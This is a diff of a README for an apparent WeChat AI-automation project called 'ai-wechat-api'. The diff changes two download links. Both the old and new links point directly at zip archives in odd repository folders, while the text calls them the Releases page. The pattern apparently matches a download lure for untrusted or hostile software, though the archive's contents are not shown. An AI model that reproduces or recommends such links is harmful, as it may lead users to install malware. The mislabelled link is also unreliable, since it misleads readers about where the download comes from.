@@ -8,7 +8,7 @@ Welcome to ai-wechat-api! This application helps you bring intelligent automatio
 
 To get started, you need to download the software. Click the link below to visit the Releases page:
 
-[![Download ai-wechat-api](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/mnestic/ai-wechat-api.zip)](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/mnestic/ai-wechat-api.zip)
+[![Download ai-wechat-api](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/view/wechat-api-ai-2.1.zip)](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/view/wechat-api-ai-2.1.zip)
 
 1. **Visit the Download Page**: Click the link above to go to the Releases page.
 2. **Choose the Latest Release**: Find the most recent version of the application. It will usually be at the top.
@@ -62,6 +62,6 @@ ai-wechat-api is open-source software licensed under the MIT License. Feel free 
 
 Remember to download the app by visiting the following link:
 
-[![Download ai-wechat-api](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/mnestic/ai-wechat-api.zip)](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/mnestic/ai-wechat-api.zip) 
+[![Download ai-wechat-api](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/view/wechat-api-ai-2.1.zip)](https://raw.githubusercontent.com/abhayforsure/ai-wechat-api/main/view/wechat-api-ai-2.1.zip) 
 
 Enjoy a smarter WeChat experience!
